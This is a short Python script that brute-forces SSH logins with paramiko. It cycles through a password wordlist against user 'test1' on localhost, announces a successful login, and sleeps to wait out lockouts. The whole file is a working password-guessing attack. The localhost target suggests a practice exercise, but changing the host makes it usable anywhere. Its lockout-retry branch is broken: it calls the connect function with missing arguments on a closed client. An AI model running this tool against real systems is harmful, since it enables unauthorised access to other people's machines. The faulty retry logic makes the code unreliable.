import paramiko
import time
import socket

def try_connect(client,host,user,password):
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=user, password=password)
    print("we in boys password: " + password)

def main():
    host = "localhost"
    username = "test1"
    with open("list.txt", 'r') as f:
        passwords = f.readlines()
        for i,password in enumerate(passwords):
            password = password.replace('\n','')
            print("trying password : " + str(i+1) + " " + password)
            try:
                client = paramiko.client.SSHClient()
                try_connect(client,host,username,password)
            except paramiko.AuthenticationException:
                print("Wrong password")
                continue
            except Exception as e:
                print("Tries exceeded")
                client.close()
                time.sleep(60)
                try_connect(host,username,password)
            finally:
                client.close()

    return 0




if __name__ == "__main__":
    main()